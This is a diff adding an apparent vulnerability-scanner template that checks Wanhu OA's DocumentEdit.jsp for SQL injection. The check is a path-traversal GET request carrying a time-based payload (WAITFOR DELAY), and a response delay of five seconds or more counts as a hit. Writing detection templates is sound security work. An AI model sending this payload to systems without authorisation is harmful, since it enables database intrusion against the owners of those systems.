@@ -1,0 +1,27 @@
+id: wanhuOA-DocumentEdit-sql-injection
+
+info:
+  name: 万户OA DocumentEdit.jsp SQL注入漏洞
+  author: cnaq 
+  severity: high
+  description: 万户OA DocumentEdit.jsp文件存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20DocumentEdit.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: wanhu,OA,edit,sql
+
+
+requests:
+  - raw:
+      - |
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: dsl
+        dsl:
+          - 'duration>=5'
